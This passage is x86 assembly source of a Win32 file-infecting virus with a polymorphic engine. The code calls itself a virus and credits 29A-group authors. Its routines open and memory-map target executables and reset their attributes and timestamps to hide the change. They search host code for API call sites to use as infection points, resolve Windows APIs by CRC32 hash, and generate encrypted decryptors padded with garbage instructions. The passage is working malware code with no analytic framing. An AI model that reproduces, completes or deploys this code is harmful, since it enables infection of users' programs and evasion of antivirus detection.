           mov esi,dword ptr [ebp+h_CreateFile]
           push esi                ; hFile

           call dword ptr [ebp+a_SetFilePointer]

           cmp eax,0FFFFFFFFh
           je cant_resize

           push esi                ; hFile

           call dword ptr [ebp+a_SetEndOfFile]

           inc byte ptr [ebp+NumInfected]

   cant_resize:    call HandleClose
           ret

                   ;------------------------------------------------------------
           ;Close file mapping
                   ;------------------------------------------------------------

   inf_close_file: call UnmapClose
           call HandleClose
   inf_file_err:   ret

   ;----------------------------------------------------------------------------
   ;Scan host code
   ;
   ;On entry:
   ;               ebx -> Memory image base address
   ;Exit:
   ;               ecx -> Inject point offset in file
   ;                      or NULL if error
   ;----------------------------------------------------------------------------

   ApeIt:      mov edx,dword ptr [ebp+FileImport]
           call RVA2RAW
           mov dword ptr [ebp+ImportSH],edi

           call get_code_sh
           jecxz ExitApe

           mov eax,dword ptr [esi+OH_ImageBase]
           mov dword ptr [ebp+host_base],eax

           sub edx,dword ptr [edi+SH_VirtualAddress]

           mov ecx,dword ptr [edi+SH_SizeOfRawData]
           sub ecx,edx

           add edx,dword ptr [edi+SH_PointerToRawData];Entry-point RAW

           lea esi,dword ptr [ebx+edx]

   search_call:    push ecx
           xor eax,eax

           lodsb
           cmp al,0E8h ;Api call generated by Borland Linker?
           je try_borland

           cmp al,0FFh ;Api call generated by Microsoft Linker?
           je try_microsoft

   err_api_call:   pop ecx
           loop search_call
   ExitApe:    ret

   try_borland:    mov eax,esi
           add eax,dword ptr [esi]         ;Go to refered address
           sub eax,ebx             ;Convert to rva

           mov edx,dword ptr [edi+SH_VirtualAddress]
           cmp eax,edx
           jb err_api_call             ;Below code?

           add edx,dword ptr [edi+SH_VirtualSize]
           cmp eax,edx
           jae err_api_call            ;Above code?

           cmp word ptr [eax+ebx-00000002h],25FFh  ;JMP DWORD PTR [xxxx]
           jne err_api_call

           push dword ptr [eax+ebx]
           pop eax
           sub eax,dword ptr [ebp+host_base]   ;Get a RVA again

           mov edx,dword ptr [ebp+ImportSH]
           mov ecx,dword ptr [edx+SH_VirtualAddress]
           cmp eax,ecx
           jb err_api_call             ;Below imports?

           add ecx,dword ptr [edx+SH_VirtualSize]
           cmp eax,ecx
           jae err_api_call            ;Above imports?

           sub eax,dword ptr [edx+SH_VirtualAddress]
           add eax,dword ptr [edx+SH_PointerToRawData]

           push dword ptr [eax+ebx]
           pop eax

           mov edx,dword ptr [ebp+ImportSH]
           mov ecx,dword ptr [edx+SH_VirtualAddress]
           cmp eax,ecx
           jb err_api_call             ;Below imports?

           add ecx,dword ptr [edx+SH_VirtualSize]
           cmp eax,ecx
           jae err_api_call            ;Above imports?

   found_place:    ;Use this point? or better continue the search?

           call get_rnd_range
           test eax,01h
           jz err_api_call

           pop eax
           mov ecx,esi
           dec ecx
           sub ecx,ebx

           ret

   try_microsoft:  cmp byte ptr [esi],15h
           jne err_api_call
           mov eax,dword ptr [esi+00000001h]
           sub eax,dword ptr [ebp+host_base]

           mov edx,dword ptr [ebp+ImportSH]
           mov ecx,dword ptr [edx+SH_VirtualAddress]
           cmp eax,ecx
           jb err_api_call             ;Below imports?

           add ecx,dword ptr [edx+SH_VirtualSize]
           cmp eax,ecx
           jae err_api_call            ;Above imports?

           sub eax,dword ptr [edx+SH_VirtualAddress]
           add eax,dword ptr [edx+SH_PointerToRawData]
           push dword ptr [eax+ebx]
           pop eax

           ;If file is binded eax contains the address of the API
           ;Lets check if eax points to a KERNEL32 API

           cmp eax,dword ptr [ebp+K32CodeStart]
           jb inside_import
           cmp eax,dword ptr [ebp+K32CodeEnd]
           jb found_place

   inside_import:  mov edx,dword ptr [ebp+ImportSH]
           mov ecx,dword ptr [edx+SH_VirtualAddress]
           cmp eax,ecx
           jb err_api_call             ;Below imports?

           add ecx,dword ptr [edx+SH_VirtualSize]
           cmp eax,ecx
           jae err_api_call            ;Above imports?

           jmp found_place

   ;----------------------------------------------------------------------------
   ;SEH handling routines coded by Jacky Qwerty / 29A
   ;----------------------------------------------------------------------------

   SEH_Frame:  sub edx,edx
                   push dword ptr fs:[edx]
                   mov fs:[edx],esp
                   jmp [esp.(02h*Pshd).RetAddr]

   SEH_RemoveFrame:push 00000000h
                   pop edx
                   pop dword ptr [esp.(02h*Pshd).RetAddr]
                   pop dword ptr fs:[edx]
                   pop edx
                   ret (Pshd)

   SEH_SetupFrame: call SEH_Frame
                   mov eax,[esp.EH_ExceptionRecord]
                   test byte ptr [eax.ER_ExceptionFlags],          \
                                  EH_UNWINDING or EH_EXIT_UNWIND
                   mov eax,dword ptr [eax.ER_ExceptionCode]
                   jnz SEH_Search
                   add eax,-EXCEPTION_ACCESS_VIOLATION
                   jnz SEH_Search
                   mov esp,dword ptr [esp.EH_EstablisherFrame]
                   mov dword ptr fs:[eax],esp
                   jmp dword ptr [esp.(02h*Pshd).Arg1]
   SEH_Search: xor eax,eax
                   ret

   ;----------------------------------------------------------------------------
   ;Open file and create its memory mapped image
   ;
   ;On entry:
   ;       BufStrFilename  -> Buffer filled with path + filename
   ;       edi     -> FALSE for read-only
   ;                  TRUE  for read-write
   ;Exit:
   ;       eax -> Base address of memory map for file or null if error
   ;----------------------------------------------------------------------------

                   ;------------------------------------------------------------
           ;Save current file attributes
           ;------------------------------------------------------------

   OpenMapFile:    lea esi,dword ptr [ebp+BufStrFilename]
           push esi

           call dword ptr [ebp+a_GetFileAttributesA]

           cmp eax,0FFFFFFFFh
           je e_OpenMapFile

           mov dword ptr [ebp+CurFileAttr],eax

           ;------------------------------------------------------------
                   ;Blow up file attributes so we can read/write
           ;------------------------------------------------------------

                   push FILE_ATTRIBUTE_NORMAL      ; dwFileAttributes
                   push esi                ; lpFileName

                   call dword ptr [ebp+a_SetFileAttributesA]

                   or eax,eax
                   jz e_OpenMapFile

           ;------------------------------------------------------------
                   ;Open existing file
           ;------------------------------------------------------------

                   xor eax,eax
                   push eax                ; hTemplateFile
                   push FILE_ATTRIBUTE_NORMAL      ; dwFlagsAndAttributes
                   push OPEN_EXISTING          ; dwCreationDisposition
                   push eax                ; lpSecurityAttributes
                   push eax                ; dwShareMode

           or edi,edi
           jz open_ro
           mov eax,GENERIC_WRITE
   open_ro:    or eax,GENERIC_READ
                   push eax                ; dwDesiredAccess

           push esi                ; lpFileName

                   call dword ptr [ebp+a_CreateFileA]

                   cmp eax,INVALID_HANDLE_VALUE
                   je Restore_Attrib

           mov dword ptr [ebp+h_CreateFile],eax

           ;------------------------------------------------------------
           ;Create filemapping over file
           ;------------------------------------------------------------

           xor edx,edx
                   push edx                ; lpName

           mov esi,dword ptr [ebp+                 \
                      DirectFindData+          \
                      WFD_nFileSizeLow]
           or edi,edi
           jz size_ro
           add esi,size_virtual + 00008000h
   size_ro:    push esi                ; dwMaximumSizeLow

                   push edx                ; dwMaximumSizeHigh

           or edi,edi
           jz map_ro
           push PAGE_READWRITE
           jmp short done_map_r
   map_ro:     push PAGE_READONLY      ; flProtect

   done_map_r:     push edx            ; lpFileMappingAttributes
                   push eax            ; hFile

                   call dword ptr [ebp+a_CreateFileMappingA]

                   or eax,eax
                   jz Close_Create

           mov dword ptr [ebp+h_FileMap],eax

           ;------------------------------------------------------------
                   ;Map file in memory, get base address
           ;------------------------------------------------------------

                   xor edx,edx
                   push esi            ; dwNumberOfBytesToMap
                   push edx            ; dwFileOffsetLow
                   push edx            ; dwFileOffsetHigh

           or edi,edi
           jz secmap_ro
           push FILE_MAP_ALL_ACCESS
           jmp short done_secmap_ro
   secmap_ro:  push FILE_MAP_READ          ; dwDesiredAccess

   done_secmap_ro: push eax                ; hFileMappingObject

                   call dword ptr [ebp+a_MapViewOfFile]

                   or eax,eax
                   jz err_MapView

           mov dword ptr [ebp+map_is_here],eax

           ret

   err_MapView:    call Close_Mapping
           jmp HandleClose

   ;----------------------------------------------------------------------------
   ;Unmap memory mapped file
   ;
   ;On entry:
   ;       ebx -> File base address in memory
   ;----------------------------------------------------------------------------

   UnmapClose: push ebx
                   call dword ptr [ebp+a_UnmapViewOfFile]

           ;------------------------------------------------------------
           ;Close handle created by CreateFileMappingA
           ;------------------------------------------------------------

   Close_Mapping:  push dword ptr [ebp+h_FileMap]
                   call dword ptr [ebp+a_CloseHandle]
           xor eax,eax
           ret

           ;------------------------------------------------------------
           ;Restore file time
           ;------------------------------------------------------------

   HandleClose:    cld
                   lea eax,dword ptr [ebp+                                     \
                      DirectFindData+                          \
                      WFD_ftLastWriteTime]
           push eax
           sub eax,00000008h
           push eax
           sub eax,00000008h
           push eax
           push dword ptr [ebp+h_CreateFile]
           call dword ptr [ebp+a_SetFileTime]

           ;------------------------------------------------------------
           ;Close handle created by CreateFileA
           ;------------------------------------------------------------

   Close_Create:   push dword ptr [ebp+h_CreateFile]
                   call dword ptr [ebp+a_CloseHandle]

           ;------------------------------------------------------------
           ;Restore file attributes
           ;------------------------------------------------------------

   Restore_Attrib: push dword ptr [ebp+CurFileAttr]
                   lea eax,dword ptr [ebp+BufStrFilename]
                   push eax
                   call dword ptr [ebp+a_SetFileAttributesA]

   e_OpenMapFile:  xor eax,eax
           ret

   ;----------------------------------------------------------------------------
   ;Make crc lookup table
   ;
   ;Generate a table for a byte-wise 32-bit CRC calculation on the polynomial:
   ;x^32+x^26+x^23+x^22+x^16+x^12+x^11+x^10+x^8+x^7+x^5+x^4+x^2+x+1.
   ;
   ;Polynomials over GF(2) are represented in binary, one bit per coefficient,
   ;with the lowest powers in the most significant bit.  Then adding polynomials
   ;is just exclusive-or, and multiplying a polynomial by x is a right shift by
   ;one.  If we call the above polynomial p, and represent a byte as the
   ;polynomial q, also with the lowest power in the most significant bit (so the
   ;byte 0xb1 is the polynomial x^7+x^3+x+1), then the CRC is (q*x^32) mod p,
   ;where a mod b means the remainder after dividing a by b.
   ;
   ;This calculation is done using the shift-register method of multiplying and
   ;taking the remainder.  The register is initialized to zero, and for each
   ;incoming bit, x^32 is added mod p to the register if the bit is a one (where
   ;x^32 mod p is p+x^32 = x^26+...+1), and the register is multiplied mod p by
   ;x (which is shifting right by one and adding x^32 mod p if the bit shifted
   ;out is a one).  We start with the highest power (least significant bit) of
   ;q and repeat for all eight bits of q.
   ;
   ;The table is simply the CRC of all possible eight bit values.  This is all
   ;the information needed to generate CRC's on data a byte at a time for all
   ;combinations of CRC register values and incoming bytes.
   ;
   ;Original C code by Mark Adler
   ;Translated to asm for Win32 by GriYo
   ;----------------------------------------------------------------------------

   make_crc_tbl:

   ;----------------------------------------------------------------------------
   ;Make exclusive-or pattern from polynomial (0EDB88320h)
   ;
   ;The following commented code is an example of how to
   ;make the exclusive-or pattern from polynomial
   ;at runtime
   ;
   ;       xor edx,edx
   ;       mov ecx,0000000Eh
   ;       lea ebx,dword ptr [ebp+tbl_terms]
   ;calc_poly: mov eax,ecx
   ;       xlatb
   ;       sub eax,0000001Fh
   ;       neg eax
   ;       bts edx,eax
   ;       loop calc_poly
   ;
   ;       edx contains now the exclusive-or pattern
   ;
   ;The polynomial is:
   ;
   ; X^32+X^26+X^23+X^22+X^16+X^12+X^11+X^10+X^8+X^7+X^5+X^4+X^2+X^1+X^0
   ;
   ;tbl_terms      db 0,1,2,4,5,7,8,10,11,12,16,22,23,26
   ;
   ;----------------------------------------------------------------------------

           cld
           mov ecx,00000100h
           lea edi,dword ptr [ebp+tbl_crc32]
   crc_tbl_do: mov eax,000000FFh
           sub eax,ecx
           push ecx
           mov ecx,00000008h
   make_crc_value: shr eax,01h
           jnc next_value
           xor eax,0EDB88320h
   next_value: loop make_crc_value
           pop ecx
           stosd
           loop crc_tbl_do
           ret

   ;----------------------------------------------------------------------------
   ;Return a 32bit CRC of the contents of the buffer
   ;
   ;On entry:
   ;       esi -> Ptr to buffer
   ;       ecx -> Buffer size
   ;On exit:
   ;       edx -> 32bit CRC
   ;----------------------------------------------------------------------------

   get_crc32:  cld
           push edi
           xor edx,edx
           lea edi,dword ptr [ebp+tbl_crc32]
   crc_calc:   push ecx
           lodsb
           xor eax,edx
           and eax,000000FFh
           shr edx,08h
           xor edx,dword ptr [edi+eax]
           pop ecx
           loop crc_calc
           pop edi
           ret

   ;----------------------------------------------------------------------------
   ;Get a 32bit CRC of a null terminated array
   ;
   ;On entry:
   ;       esi -> Ptr to string
   ;Exit:
   ;       edx -> 32bit CRC
   ;----------------------------------------------------------------------------

   get_str_crc32:  cld
           push ecx
           push edi
           mov edi,esi
           xor eax,eax
           mov ecx,eax
   crc_sz:     inc ecx
           scasb
           jnz crc_sz
           call get_crc32
           pop edi
           pop ecx
           ret

   ;----------------------------------------------------------------------------
   ;Get the entry-point of GetProcAddress
   ;
   ;On entry:
   ;       ebx -> KERNELL32 base address
   ;On exit:
   ;       ecx -> Address of GetProcAddress
   ;----------------------------------------------------------------------------

   GetGetProcAddr: cld
           mov eax,dword ptr [ebx+IMAGE_DOS_HEADER.MZ_lfanew]
                   mov edx,dword ptr [eax+                 \
                      ebx+                 \
                      NT_OptionalHeader.           \
                                      OH_DirectoryEntries.         \
                                      DE_Export.               \
                                      DD_VirtualAddress]
                   add edx,ebx
           mov esi,dword ptr [edx+ED_AddressOfNames]
           add esi,ebx
           mov edi,dword ptr [edx+ED_AddressOfNameOrdinals]
           add edi,ebx
           mov ecx,dword ptr [edx+ED_NumberOfNames]

   function_loop:  lodsd
           push edx
           push esi
           lea esi,dword ptr [eax+ebx]     ;Get ptr to API name
           call get_str_crc32      ;Get CRC32 of API name
           pop esi
           cmp edx,dword ptr [ebp+CrcGetProcAddr]
           je API_found
           inc edi
           inc edi
           pop edx
           loop function_loop
           ret

   API_found:  pop edx
           movzx eax,word ptr [edi]
           sub eax,dword ptr [edx+ED_BaseOrdinal]
           inc eax
           shl eax,02h
           mov esi,dword ptr [edx+ED_AddressOfFunctions]
                   add esi,eax
                   add esi,ebx
                   lodsd
           lea ecx,dword ptr [eax+ebx]
                   ret

   ;----------------------------------------------------------------------------
   ;Get the entry-point of each needed API
   ;
   ;This routine uses the CRC32 instead of API names
   ;
   ;On entry:
   ;       ebx -> Base address of DLL
   ;       ecx -> Number of APIs in the folling buffer
   ;       esi -> Buffer filled with the CRC32 of each API name
   ;       edi -> Recives found API addresses
   ;On exit:
   ;       ecx -> Is 00000000h if everything was ok
   ;----------------------------------------------------------------------------

   get_APIs:   cld
   get_each_API:   push ecx
           push esi

           ;------------------------------------------------------------
           ;Get a pointers to the EXPORT data
           ;------------------------------------------------------------

           mov eax,dword ptr [ebx+IMAGE_DOS_HEADER.MZ_lfanew]
                   mov edx,dword ptr [eax+                 \
                      ebx+                 \
                      NT_OptionalHeader.           \
                                      OH_DirectoryEntries.         \
                                      DE_Export.               \
                                      DD_VirtualAddress]
                   add edx,ebx
           mov esi,dword ptr [edx+ED_AddressOfNames]
           add esi,ebx
           mov ecx,dword ptr [edx+ED_NumberOfNames]

           ;------------------------------------------------------------
           ;Try to find tha API name that matches given CRC32
           ;------------------------------------------------------------

   API_Loop:   lodsd
           push esi            ;Ptr to AddressOfNames
           lea esi,dword ptr [eax+ebx] ;Get ptr to API name
           push esi            ;Save ptr to API name
           call get_str_crc32      ;Get CRC32 of API name
           mov esi,dword ptr [esp+00000008h]
           lodsd
           cmp eax,edx
           je CRC_API_found
           pop eax             ;Remove API name from stack
           pop esi             ;Ptr to RVA for next API name
           loop API_Loop
   get_API_error:  pop esi             ;Ptr to CRC's of API names
           pop ecx             ;Number of API's
           ret             ;Exit with error (ecx!=NULL)

           ;------------------------------------------------------------
           ;The ptr to API name is already on stack, now push the
           ;module handle and call GetProcAddress
           ;------------------------------------------------------------

   CRC_API_found:  push ebx
           call dword ptr [ebp+a_GetProcAddress]

           cld     ;Dont let the API call change this
           pop edx     ;Remove ptr to RVA for next name

           or eax,eax
           jz get_API_error;If GetProcAddress returned NULL exit

           stosd       ;Save the API address into given table
           pop esi     ;Ptr to CRC's of API names
           lodsd
           pop ecx
           loop get_each_API
           ret

   ;----------------------------------------------------------------------------
   ;Convert RVA to RAW
   ;
   ;On entry:
   ;       ebx -> Host base address
   ;       edx -> RVA to convert
   ;On exit:
   ;       ecx -> Pointer to RAW data or NULL if error
   ;       edx -> Section delta offset
   ;       esi -> Pointer to IMAGE_OPTIONAL_HEADER
   ;       edi -> Pointer to section header
   ;----------------------------------------------------------------------------

   RVA2RAW:        cld
                   mov dword ptr [ebp+search_raw],edx
                   mov esi,dword ptr [ebx+MZ_lfanew]
                   add esi,ebx
                   lodsd
                   movzx ecx,word ptr [esi+FH_NumberOfSections]
                   jecxz err_RVA2RAW
                   movzx edi,word ptr [esi+FH_SizeOfOptionalHeader]
                   add esi,IMAGE_SIZEOF_FILE_HEADER
                   add edi,esi

           ;------------------------------------------------------------
                   ;Get the IMAGE_SECTION_HEADER that contains RVA
                   ;
                   ;At this point:
                   ;
                   ;ebx -> File base address
                   ;esi -> Pointer to IMAGE_OPTIONAL_HEADER
                   ;edi -> Pointer to first section header
                   ;ecx -> Number of sections
           ;
           ;Check if address of imports directory is inside this
                   ;section
           ;------------------------------------------------------------


   s_img_section:  mov eax,dword ptr [ebp+search_raw]
                   mov edx,dword ptr [edi+SH_VirtualAddress]
                   sub eax,edx
                   cmp eax,dword ptr [edi+SH_VirtualSize]
                   jb section_ok

           ;------------------------------------------------------------
           ;Go to next section header
           ;------------------------------------------------------------

   out_of_section: add edi,IMAGE_SIZEOF_SECTION_HEADER
                   loop s_img_section
   err_RVA2RAW:    ret

           ;------------------------------------------------------------
           ;Get raw
           ;------------------------------------------------------------

   section_ok:     mov ecx,dword ptr [edi+SH_PointerToRawData]
                   sub edx,ecx
                   add ecx,eax
                   add ecx,ebx
                   ret

   ;----------------------------------------------------------------------------
   ;Get code section header and entry-point information
   ;
   ;On entry:
   ;       ebx -> Host base address
   ;On exit:
   ;       ecx -> Pointer to RAW data or NULL if error
   ;       edx -> Entry-point RVA
   ;       esi -> Pointer to IMAGE_OPTIONAL_HEADER
   ;       edi -> Pointer to section header
   ;----------------------------------------------------------------------------

   get_code_sh:    call get_last_sh
           mov edx,dword ptr [esi+OH_AddressOfEntryPoint]
           push edx
                   call RVA2RAW
           pop edx
           ret

   ;----------------------------------------------------------------------------
   ;Get pointer to last section header
   ;
   ;On entry:
   ;       ebx -> Host base address
   ;On exit:
   ;       esi -> IMAGE_OPTIONAL_HEADER
   ;       edi -> Pointer to last section header
   ;----------------------------------------------------------------------------

   get_last_sh:    push ecx
                   mov esi,dword ptr [ebx+MZ_lfanew]
                   add esi,ebx
                   cld
                   lodsd
                   movzx ecx,word ptr [esi+FH_NumberOfSections]
                   dec ecx
                   mov eax,IMAGE_SIZEOF_SECTION_HEADER
                   mul ecx
                   movzx edx,word ptr [esi+FH_SizeOfOptionalHeader]
                   add esi,IMAGE_SIZEOF_FILE_HEADER
                   add eax,edx
                   add eax,esi
                   mov edi,eax
           pop ecx
                   ret

   ;----------------------------------------------------------------------------
   ;This routine takes a string pointed by esi and copies
   ;it into a buffer pointed by edi
   ;The result string will be converted to upper-case
   ;
   ;On entry:
   ;       esi -> Pointer to source string
   ;       edi -> Pointer to returned string
   ;
   ;On exit:
   ;       al  -> Null
   ;       edx -> Points to filename at the end of path
   ;       edi -> Points 1byte above the null terminator
   ;----------------------------------------------------------------------------

   parse_filename: mov edx,edi
           cld
   ScanZstring:    lodsb
           cmp al,"a"
           jb no_upper
           cmp al,"z"
           ja no_upper
           and al,0DFh
   no_upper:   stosb
           cmp al,"\"
           jne err_slash_pos
           mov edx,edi
   err_slash_pos:  or al,al
           jnz ScanZstring
           ret

   ;----------------------------------------------------------------------------
   ;Generate data area suitable for memory write access
   ;
   ;       edi -> Base address
   ;       ecx -> Size
   ;----------------------------------------------------------------------------

   gen_data_area:  push eax
           push edx

           movzx eax,byte ptr [ebp+NumberOfDataAreas]
           cmp eax,NUM_DA
           jae no_more_da

           lea edx,dword ptr [ebp+tbl_data_area+eax*08h]

           mov eax,edi
           sub eax,dword ptr [ebp+map_is_here]
           add eax,dword ptr [ebp+host_base]

           push ecx

           mov ecx,dword ptr [ebp+virus_sh]
           sub eax,dword ptr [ecx+SH_PointerToRawData]
           add eax,dword ptr [ecx+SH_VirtualAddress]
           mov dword ptr [edx],eax

           pop ecx
           mov dword ptr [edx+00000004h],ecx

           inc byte ptr [ebp+NumberOfDataAreas]
   no_more_da: pop edx
           pop eax
           ret

   ;----------------------------------------------------------------------------
   ;Generate a block of random data
   ;----------------------------------------------------------------------------

   gen_rnd_block:  mov eax,0000000Ah
           mov ecx,eax
                   call get_rnd_range
                   add ecx,eax
           call gen_data_area
   rnd_fill:       cld
   rnd_fill_loop:  call get_rnd32
                   stosb
                   loop rnd_fill_loop
                   ret

   ;----------------------------------------------------------------------------
   ;Linear congruent pseudorandom number generator
   ;----------------------------------------------------------------------------

   get_rnd32:      push ecx
                   push edx
                   mov eax,dword ptr [ebp+rnd32_seed]
                   mov ecx,41C64E6Dh
                   mul ecx
                   add eax,00003039h
                   and eax,7FFFFFFFh
                   mov dword ptr [ebp+rnd32_seed],eax
                   pop edx
                   pop ecx
                   ret

   ;----------------------------------------------------------------------------
   ;Returns a random num between 0 and entry eax
   ;----------------------------------------------------------------------------

   get_rnd_range:  push ecx
                   push edx
                   mov ecx,eax
                   call get_rnd32
                   xor edx,edx
                   div ecx
                   mov eax,edx
                   pop edx
                   pop ecx
                   ret

   ;----------------------------------------------------------------------------
   ;Perform encryption
   ;----------------------------------------------------------------------------

           ;------------------------------------------------------------
           ;This buffer will contain the code to "crypt" the virus code
                   ;followed by a RET instruction
           ;------------------------------------------------------------

   perform_crypt:  db 10h dup (90h)

   ;----------------------------------------------------------------------------
   ;Generate decryptor action: Load pointer
   ;
   ;We dont need to get delta-offset, this virus assumes fixed load address
   ;----------------------------------------------------------------------------

   gen_load_ptr:   mov al,0B8h
                   or al,byte ptr [ebp+index_mask]
                   stosb
           mov eax,dword ptr [ebp+host_base]
           add eax,dword ptr [ebp+PtrToCrypt]
           add eax,dword ptr [ebp+ptr_disp]
           mov edx,dword ptr [ebp+virus_sh]
           sub eax,dword ptr [edx+SH_PointerToRawData]
           add eax,dword ptr [edx+SH_VirtualAddress]
                   test byte ptr [ebp+build_flags],CRYPT_DIRECTION
                   jz fix_dir_ok
                   push eax                ;Fix upon direction
                   call fixed_size2ecx
                   xor eax,eax
                   mov al,byte ptr [ebp+oper_size]
                   push eax
                   mul ecx
                   pop ecx
                   sub eax,ecx
                   pop ecx
                   add eax,ecx
   fix_dir_ok: stosd
           ret

   ;----------------------------------------------------------------------------
   ;Generate decryptor action: Load counter
   ;----------------------------------------------------------------------------

           ;------------------------------------------------------------
           ;Easy now, just move counter random initial value
                   ;into counter reg and calculate the end value
           ;------------------------------------------------------------

   gen_load_ctr:   mov al,0B8h
                   or al,byte ptr [ebp+counter_mask]
                   stosb
                   call fixed_size2ecx
                   call get_rnd32
                   stosd
                   test byte ptr [ebp+build_flags],CRYPT_CDIR
                   jnz counter_down
   counter_up:     add eax,ecx
                   jmp short done_ctr_dir
   counter_down:   sub eax,ecx
   done_ctr_dir:   mov dword ptr [ebp+end_value],eax
                   ret

   ;----------------------------------------------------------------------------
   ;Generate decryptor action: Decrypt
   ;----------------------------------------------------------------------------

   gen_decrypt:    mov eax,dword ptr [ebp+ptr_disp]
           mov dword ptr [ebp+fake_ptr_disp],eax

           mov eax,dword ptr [ebp+crypt_key]
           mov dword ptr [ebp+fake_crypt_key],eax

           mov al,byte ptr [ebp+build_flags]
           mov byte ptr [ebp+fake_build_flags],al

           mov al,byte ptr [ebp+oper_size]
           mov byte ptr [ebp+fake_oper_size],al

           mov al,byte ptr [ebp+index_mask]
           mov byte ptr [ebp+fake_index_mask],al

           call fake_or_not

           xor eax,eax
                   mov al,byte ptr [ebp+oper_size]
                   shr eax,01h
                   shl eax,02h
                   add esi,eax
                   lodsd
                   add eax,ebp
                   mov esi,eax
                   push edi
                   lea edi,dword ptr [ebp+perform_crypt]
   loop_string:    lodsb
                   cmp al,MAGIC_ENDSTR
                   je end_of_magic
                   cmp al,MAGIC_ENDKEY
                   je last_spell
                   xor ecx,ecx
                   mov cl,al
                   rep movsb
                   jmp short loop_string
   last_spell:     call copy_key
   end_of_magic:   mov al,0C3h
           stosb
           pop edi
                   ret

   ;----------------------------------------------------------------------------
   ;Copy encryption key into work buffer taking care about operand size
   ;----------------------------------------------------------------------------

   copy_key:       mov eax,dword ptr [ebp+fake_crypt_key]
                   movzx ecx,byte ptr [ebp+fake_oper_size]
   loop_key:       stosb
                   shr eax,08h
                   loop loop_key
                   ret

   ;----------------------------------------------------------------------------
   ;Generate decryptor action: Move index to next step
   ;----------------------------------------------------------------------------

           ;------------------------------------------------------------
           ;Get number of bytes to inc or dec the index reg
           ;------------------------------------------------------------

   gen_next_step:  xor ecx,ecx
                   mov cl,byte ptr [ebp+oper_size]

           ;------------------------------------------------------------
           ;Get number of bytes to update with this instruction
           ;------------------------------------------------------------

   loop_update:    mov eax,ecx
                   call get_rnd_range
                   inc eax

           ;------------------------------------------------------------
                   ;Check direction
           ;------------------------------------------------------------

                   test byte ptr [ebp+build_flags],CRYPT_DIRECTION
                   jnz step_down

                   call do_step_up
                   jmp short next_update

   step_down:      call do_step_down

   next_update:    sub ecx,eax
           call gen_garbage
                   jecxz end_update
                   jmp short loop_update
   end_update:     ret

           ;------------------------------------------------------------
           ;Move index_reg up
           ;------------------------------------------------------------

   do_step_up:     or eax,eax
                   jz up_with_inc

           ;------------------------------------------------------------
                   ;Now choose ADD or SUB
           ;------------------------------------------------------------

                   push eax
                   call get_rnd32
                   and al,01h
                   jnz try_sub_1

   try_add_1:      mov ax,0C081h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   stosd
                   ret

   try_sub_1:      mov ax,0E881h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   neg eax
                   stosd
                   neg eax
                   ret

           ;------------------------------------------------------------
           ;Generate INC reg_index
           ;------------------------------------------------------------

   up_with_inc:    mov al,40h
                   or al,byte ptr [ebp+index_mask]
                   stosb
                   mov eax,00000001h
                   ret

           ;------------------------------------------------------------
           ;Move index_reg down
           ;------------------------------------------------------------

   do_step_down:   or eax,eax
                   jz down_with_dec

           ;------------------------------------------------------------
                   ;Now choose ADD or SUB
           ;------------------------------------------------------------

                   push eax
                   call get_rnd32
                   and al,01h
                   jnz try_sub_2

   try_add_2:      mov ax,0C081h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   neg eax
                   stosd
                   neg eax
                   ret

   try_sub_2:      mov ax,0E881h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   stosd
                   ret

           ;------------------------------------------------------------
           ;Generate DEC reg_index
           ;------------------------------------------------------------

   down_with_dec:  mov al,48h
                   or al,byte ptr [ebp+index_mask]
                   stosb
                   mov eax,00000001h
                   ret

   ;----------------------------------------------------------------------------
   ;Generate decryptor action: Next counter value
   ;----------------------------------------------------------------------------

           ;------------------------------------------------------------
           ;Check counter direction and update counter
                   ;using a INC or DEC instruction
           ;------------------------------------------------------------

   gen_next_ctr:   test byte ptr [ebp+build_flags],CRYPT_CDIR
                   jnz upd_ctr_down
   upd_ctr_up:     mov al,40h
                   or al,byte ptr [ebp+counter_mask]
                   jmp short upd_ctr_ok
   upd_ctr_down:   mov al,48h
                   or al,byte ptr [ebp+counter_mask]
   upd_ctr_ok:     stosb
                   ret

   ;----------------------------------------------------------------------------
   ;Generate decryptor action: Loop
   ;----------------------------------------------------------------------------

           ;------------------------------------------------------------
           ;Use counter reg in CMP instruction?
           ;------------------------------------------------------------

   gen_loop:       test byte ptr [ebp+build_flags],CRYPT_CMPCTR
                   jnz doloopauxreg

           ;------------------------------------------------------------
                   ;Generate CMP counter_reg,end_value
           ;------------------------------------------------------------

                   mov ax,0F881h
                   or ah,byte ptr [ebp+counter_mask]
                   stosw
                   mov eax,dword ptr [ebp+end_value]
                   stosd

                   jmp doloopready

           ;------------------------------------------------------------
           ;Get a random valid register to use in a CMP instruction
           ;------------------------------------------------------------

   doloopauxreg:   call get_valid_reg
                   or byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

           ;------------------------------------------------------------
                   ;Move index reg value into aux reg
           ;------------------------------------------------------------

                   mov ah,byte ptr [ebx+REG_MASK]
                   shl ah,03h
                   or ah,byte ptr [ebp+counter_mask]
                   or ah,0C0h
                   mov al,8Bh
                   stosw

           ;------------------------------------------------------------
                   ;Guess what!?
           ;------------------------------------------------------------

                   push ebx
                   call gen_garbage
                   pop ebx

           call get_rnd32
           and al,03h
           or al,al
           jz loop_use_cmp
           test al,02h
           jz loop_use_sub

           ;------------------------------------------------------------
           ;Generate ADD aux_reg,-end_value
           ;------------------------------------------------------------

   loop_use_add:   mov ax,0C081h
                   or ah,byte ptr [ebx+REG_MASK]
                   stosw
                   mov eax,dword ptr [ebp+end_value]
           neg eax
                   stosd
                   jmp short done_loop_use

           ;------------------------------------------------------------
           ;Generate CMP aux_reg,end_value
           ;------------------------------------------------------------

   loop_use_cmp:   mov ax,0F881h
                   jmp short loop_mask_here

           ;------------------------------------------------------------
           ;Generate SUB aux_reg,end_value
           ;------------------------------------------------------------

   loop_use_sub:   mov eax,0E881h
   loop_mask_here: or ah,byte ptr [ebx+REG_MASK]
                   stosw
                   mov eax,dword ptr [ebp+end_value]
                   stosd

           ;------------------------------------------------------------
           ;Restore aux reg state
           ;------------------------------------------------------------

   done_loop_use:  xor byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

           ;------------------------------------------------------------
           ;Generate conditional jump
           ;------------------------------------------------------------

   doloopready:    call get_rnd32
                   and al,01h
                   jnz doloopdown

           ;------------------------------------------------------------
           ;Generate the following structure:
                   ;
                   ;       loop_point:
                   ;       ...
                   ;       cmp reg,x
